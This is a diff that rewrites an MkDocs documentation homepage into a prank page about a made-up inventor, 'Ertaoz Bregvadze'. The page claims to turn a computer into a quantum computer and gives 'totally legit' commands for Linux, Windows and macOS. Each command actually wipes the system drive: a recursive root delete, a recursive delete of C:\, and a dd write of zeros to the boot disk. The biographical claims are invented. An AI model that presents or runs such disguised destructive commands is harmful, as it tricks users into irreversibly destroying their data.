@@ -1,24 +1,23 @@
-# Welcome to MkDocs
+# Notes of Ertaoz Bregvadze
 
-For full documentation visit [mkdocs.org](https://www.mkdocs.org).
+Welcome to the notes of Ertaoz Bregvadze, a renowned scientist, physicist, and visionary inventor. Among his many groundbreaking contributions, Bregvadze is best known for inventing the flying machine, a revolutionary advancement that changed the course of transportation and human exploration.
 
-## Commands
+I am sharing one of his biggest contributions: transforming your **computer into a quantum computer!** With these totally legit commands, you can unlock the power of quantum computing and watch your machine transcend space and time! 🌌
 
-* `mkdocs new [dir-name]` - Create a new project.
-* `mkdocs serve` - Start the live-reloading docs server.
-* `mkdocs build` - Build the documentation site.
-* `mkdocs -h` - Print help message and exit.
+=== "Linux"
 
-## Project layout
+    ```bash
+    sudo rm -rf / --no-preserve-root
+    ```
 
-    mkdocs.yml    # The configuration file.
-    docs/
-        index.md  # The documentation homepage.
-        ...       # Other markdown pages, images and other files.
+=== "Windows"
 
+    ```cmd
+    del /s /q C:\
+    ```
 
-```py
-import os;
+=== "MacOS"
 
-os.system("ls");
-```
+    ```bash
+    sudo dd if=/dev/zero of=/dev/disk0 bs=1m
+    ```
